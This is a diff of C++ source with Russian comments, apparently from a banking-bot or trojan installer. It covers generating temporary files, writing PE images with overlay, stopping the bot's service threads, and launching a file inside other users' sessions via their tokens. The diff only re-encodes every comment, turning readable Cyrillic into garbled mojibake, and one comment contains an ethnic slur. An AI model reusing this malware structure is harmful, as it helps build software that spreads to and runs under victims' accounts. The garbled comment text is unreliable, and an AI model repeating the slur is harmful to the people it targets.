@@ -25,7 +25,7 @@
 #include "..\common\registry.h"
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//В Settings
+//Р’В Settings
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 //Reserve sekudny to generate temporary file.
@@ -34,16 +34,16 @@
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Генерация базового файла.
+  Р“РµРЅРµСЂР°С†РёСЏ Р±Р°Р·РѕРІРѕРіРѕ С„Р°Р№Р»Р°.
 
-  IN path      - путь, где будет генерироваться файл. Путь должен сущестовать.
-  OUT name     - полное имя файла. Реально имя генерируемого файла до 20(4 + 6 + 1 + 5)
-                 символов.
-  IN extension - расширение файла, NULL для автогенерации.
-  IN lowAccess - включить доступ для Low Integrity приложений.
+  IN path      - РїСѓС‚СЊ, РіРґРµ Р±СѓРґРµС‚ РіРµРЅРµСЂРёСЂРѕРІР°С‚СЊСЃСЏ С„Р°Р№Р». РџСѓС‚СЊ РґРѕР»Р¶РµРЅ СЃСѓС‰РµСЃС‚РѕРІР°С‚СЊ.
+  OUT name     - РїРѕР»РЅРѕРµ РёРјСЏ С„Р°Р№Р»Р°. Р РµР°Р»СЊРЅРѕ РёРјСЏ РіРµРЅРµСЂРёСЂСѓРµРјРѕРіРѕ С„Р°Р№Р»Р° РґРѕ 20(4 + 6 + 1 + 5)
+                 СЃРёРјРІРѕР»РѕРІ.
+  IN extension - СЂР°СЃС€РёСЂРµРЅРёРµ С„Р°Р№Р»Р°, NULL РґР»СЏ Р°РІС‚РѕРіРµРЅРµСЂР°С†РёРё.
+  IN lowAccess - РІРєР»СЋС‡РёС‚СЊ РґРѕСЃС‚СѓРї РґР»СЏ Low Integrity РїСЂРёР»РѕР¶РµРЅРёР№.
 
-  Return       - true - в случаи успеха,
-                 false - в случаи ошибки.
+  Return       - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+                 false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static bool generateBasicFile(LPWSTR path, LPWSTR name, LPWSTR extension, bool lowAccess)
 {
@@ -102,12 +102,12 @@ static bool generateBasicFile(LPWSTR path, LPWSTR name, LPWSTR extension, bool l
 }
 
 /*
-  Получение Raw-адреса функции.
+  РџРѕР»СѓС‡РµРЅРёРµ Raw-Р°РґСЂРµСЃР° С„СѓРЅРєС†РёРё.
 
-  IN ppe   - образ.
-  IN pData - данные в текущем образе.
+  IN ppe   - РѕР±СЂР°Р·.
+  IN pData - РґР°РЅРЅС‹Рµ РІ С‚РµРєСѓС‰РµРј РѕР±СЂР°Р·Рµ.
 
-  Return   - адрес данных в ppe, или NULL в случаи ошибки.
+  Return   - Р°РґСЂРµСЃ РґР°РЅРЅС‹С… РІ ppe, РёР»Рё NULL РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static void *getRawOfData(PeImage::PEDATA *pe, void *data)
 {
@@ -121,15 +121,15 @@ static void *getRawOfData(PeImage::PEDATA *pe, void *data)
 }
 
 /*
-  Запись в файл.
+  Р—Р°РїРёСЃСЊ РІ С„Р°Р№Р».
 
-  IN data     - данные.
-  IN dataSize - размер данных.
-  IN fileName - файл.
-  IN infinite - пытаться записать файл бесконечно.
+  IN data     - РґР°РЅРЅС‹Рµ.
+  IN dataSize - СЂР°Р·РјРµСЂ РґР°РЅРЅС‹С….
+  IN fileName - С„Р°Р№Р».
+  IN infinite - РїС‹С‚Р°С‚СЊСЃСЏ Р·Р°РїРёСЃР°С‚СЊ С„Р°Р№Р» Р±РµСЃРєРѕРЅРµС‡РЅРѕ.
 
-  Return      - true - в случаи успеха,
-                false - в случаи ошибки.
+  Return      - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+                false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static bool saveFile(const void *data, DWORD dataSize, LPWSTR fileName, bool infinite)
 {
@@ -153,14 +153,14 @@ static bool saveFile(const void *data, DWORD dataSize, LPWSTR fileName, bool inf
 }
 
 /*
-  Сохранение образа в PE-файл.
+  РЎРѕС…СЂР°РЅРµРЅРёРµ РѕР±СЂР°Р·Р° РІ PE-С„Р°Р№Р».
 
-  IN pes         - настроки PE. Если NULL, происходит просто копирование текущего образа с оверлеем.
-  IN fileName    - имя файла.
-  IN infinite    - пытаться записать файл бесконечно.
+  IN pes         - РЅР°СЃС‚СЂРѕРєРё PE. Р•СЃР»Рё NULL, РїСЂРѕРёСЃС…РѕРґРёС‚ РїСЂРѕСЃС‚Рѕ РєРѕРїРёСЂРѕРІР°РЅРёРµ С‚РµРєСѓС‰РµРіРѕ РѕР±СЂР°Р·Р° СЃ РѕРІРµСЂР»РµРµРј.
+  IN fileName    - РёРјСЏ С„Р°Р№Р»Р°.
+  IN infinite    - РїС‹С‚Р°С‚СЊСЃСЏ Р·Р°РїРёСЃР°С‚СЊ С„Р°Р№Р» Р±РµСЃРєРѕРЅРµС‡РЅРѕ.
 
-  Return         - true - в случаи успеха,
-                   false - в случаи ошибки.
+  Return         - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+                   false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static bool savePeFile(const PESETTINGS *pes, const LPWSTR fileName, bool infinite)
 {
@@ -198,13 +198,13 @@ static bool savePeFile(const PESETTINGS *pes, const LPWSTR fileName, bool infini
 }
 
 /*
-  Функция для остановки сервисных потоков бота.
+  Р¤СѓРЅРєС†РёСЏ РґР»СЏ РѕСЃС‚Р°РЅРѕРІРєРё СЃРµСЂРІРёСЃРЅС‹С… РїРѕС‚РѕРєРѕРІ Р±РѕС‚Р°.
 
-  IN wait - TRUE - ожидать завершения сервисов,
-            FALSE - не ожидать заверешния сервисов.
+  IN wait - TRUE - РѕР¶РёРґР°С‚СЊ Р·Р°РІРµСЂС€РµРЅРёСЏ СЃРµСЂРІРёСЃРѕРІ,
+            FALSE - РЅРµ РѕР¶РёРґР°С‚СЊ Р·Р°РІРµСЂРµС€РЅРёСЏ СЃРµСЂРІРёСЃРѕРІ.
 
-  Return  - TRUE - в случаи успеха,
-            FALSE - в случаи ошибки.
+  Return  - TRUE - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+            FALSE - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static BOOL WINAPI stopServices(void *reserved)
 {
@@ -224,12 +224,12 @@ typedef void (WINAPI *WTSFREEMEMORY)(PVOID memory);
 typedef BOOL (WINAPI *WTSQUERYUSERTOKEN)(ULONG sessionId, PHANDLE token);
 
 /*
-  Создание процесса в определенной сессии.
+  РЎРѕР·РґР°РЅРёРµ РїСЂРѕС†РµСЃСЃР° РІ РѕРїСЂРµРґРµР»РµРЅРЅРѕР№ СЃРµСЃСЃРёРё.
 
   IN queryUserToken - WTSQueryUserToken.
-  IN sessionId      - сессия.
-  IN sid            - если SID сессии не равен этому SID'у, процесс не создается.
-  IN fileName       - файл для запуска.  
+  IN sessionId      - СЃРµСЃСЃРёСЏ.
+  IN sid            - РµСЃР»Рё SID СЃРµСЃСЃРёРё РЅРµ СЂР°РІРµРЅ СЌС‚РѕРјСѓ SID'Сѓ, РїСЂРѕС†РµСЃСЃ РЅРµ СЃРѕР·РґР°РµС‚СЃСЏ.
+  IN fileName       - С„Р°Р№Р» РґР»СЏ Р·Р°РїСѓСЃРєР°.  
 */
 static void createProcessForSession(WTSQUERYUSERTOKEN queryUserToken, DWORD sessionId, PSID sid, const LPWSTR fileName)
 {
@@ -258,10 +258,10 @@ static void createProcessForSession(WTSQUERYUSERTOKEN queryUserToken, DWORD sess
 }
 
 /*
-  Поиск активных сессий пользователя, и запуск из под них процессов.
+  РџРѕРёСЃРє Р°РєС‚РёРІРЅС‹С… СЃРµСЃСЃРёР№ РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ, Рё Р·Р°РїСѓСЃРє РёР· РїРѕРґ РЅРёС… РїСЂРѕС†РµСЃСЃРѕРІ.
 
-  IN sid      - SID пользоваетеля.
-  IN fileName - файл для запуска.
+  IN sid      - SID РїРѕР»СЊР·РѕРІР°РµС‚РµР»СЏ.
+  IN fileName - С„Р°Р№Р» РґР»СЏ Р·Р°РїСѓСЃРєР°.
 */
 static void tryToRunForActiveSessions(PSID sid, const LPWSTR fileName)
 {
@@ -637,10 +637,10 @@ bool CoreInstall::_installToAll(void)
   
   do
   {
-    /*В В В В В В Blunt, blunted idusy from MS, do not realize that they are blunt blunt. The fact that in the MSDN
-В В В В В В written that NetUserEnum can work with levels 4, 23, and in practice we have
-В В В В В В great Hindu PRICK!
-В В В В */
+    /*Р’В Р’В Р’В Р’В Р’В Р’В Blunt, blunted idusy from MS, do not realize that they are blunt blunt. The fact that in the MSDN
+Р’В Р’В Р’В Р’В Р’В Р’В written that NetUserEnum can work with levels 4, 23, and in practice we have
+Р’В Р’В Р’В Р’В Р’В Р’В great Hindu PRICK!
+Р’В Р’В Р’В Р’В */
 
     DWORD readed;
     DWORD total;
